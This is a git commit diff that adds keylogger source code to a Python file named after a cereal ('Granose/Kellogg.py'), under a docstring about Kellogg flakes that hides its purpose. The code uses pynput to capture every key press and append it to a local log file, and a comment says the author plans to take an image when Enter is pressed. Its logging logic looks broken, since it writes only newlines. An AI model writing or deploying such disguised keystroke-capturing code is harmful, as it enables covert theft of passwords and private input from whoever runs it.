cb35143a06ea0bd3abf6d288175d49d23791db16
SB <44678673+TST314@users.noreply.github.com>
2020-09-10 15:05:32 -0400

    Update Kellogg.py

--- Granose/Kellogg.py
+++ Granose/Kellogg.py
@@ -2,6 +2,58 @@
 Granose is the first flake cereal which was created by Kellogg.
 Of course, like Kellogg's cereal, there were versions before but this will be the first working/deployable version!
 '''
-import pynput
-import os, sys
 
+from pynput.keyboard import Key, Listener
+import os, sys 
+import shutil #to copy txt files
+import datetime
+
+count = 0
+keys = []
+
+def on_press(key):
+	global keys, count
+	keys.append(key)
+	count +=1
+	print("{0} pressed".format(key))
+	if count >=1:
+		count = 0
+		write_file(keys)
+		keys = []
+
+def write_file(keys):
+	with open("32log.txt", "a+") as f:
+		for key in keys:
+			k = str(key).replace("'","")
+			if k.find("space") > 0:
+				f.write('\n')
+			elif k.find("Key") >0:
+				f.write('\n')
+
+def on_release(key):
+	if key == Key.esc:
+		return False
+
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
+	listener.join()
+
+
+
+#What I am going for:
+
+#Input: Tapestry
+
+'''
+Output:
+T
+Ta
+Tap
+Tape
+Tapes
+Tapest
+Tapestr
+Tapestry
+'''
+
+# If enter is pressed an image is taken
